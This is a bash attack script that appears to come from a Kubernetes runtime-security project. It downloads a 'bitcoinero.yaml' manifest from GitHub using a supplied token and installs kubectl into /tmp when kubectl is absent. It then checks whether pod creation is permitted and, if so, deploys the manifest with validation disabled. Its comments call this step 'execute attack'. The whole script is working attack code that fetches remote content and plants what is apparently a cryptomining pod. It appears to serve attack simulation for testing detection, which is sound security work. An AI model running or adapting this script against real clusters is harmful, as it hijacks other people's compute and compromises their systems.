#!/bin/bash

# Read Token from Argument
TOKEN=$1

# download bitcoinero.yaml using token inserted at the beginning
curl -LO https://raw.githubusercontent.com/Abdurrahmanm4nn/runtime-security-kubernetes/main/attacking-scripts/bitcoinero.yaml?token=$TOKEN
mv bitcoinero.yaml\?token\=$TOKEN bitcoinero.yaml

# check if kubectl installed
if command -v kubectl &> /dev/null
then
    # check permission to create new pod
    kubectl auth can-i create pods
    PERMISSION="$(kubectl auth can-i create pods)"
    if [ "${PERMISSION}" = "yes" ]; then
    	# execute attack and view result
    	echo "Creating new pod is allowed. Proceed to create bitcoinero pod."
    	kubectl apply -f bitcoinero.yaml --validate=false
    	sleep 5
    	kubectl get pods
    else
    	echo "Creating new pod is not allowed. Bitcoinero pod creation failed."
    fi
else
    # install kubectl
    export PATH=/tmp:$PATH
    cd /tmp; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl; chmod 555 kubectl
    # check permission to create new pod
    PERMISSION="$(./kubectl auth can-i create pods)"
    if [ "${PERMISSION}" = "yes" ]; then
    	# execute attack and view result
    	echo "Creating new pod is allowed. Proceed to create bitcoinero pod."
    	./kubectl apply -f bitcoinero.yaml --validate=false
    	sleep 5
    	./kubectl get pods
    else
    	echo "Creating new pod is not allowed. Bitcoinero pod creation failed."
    fi
fi
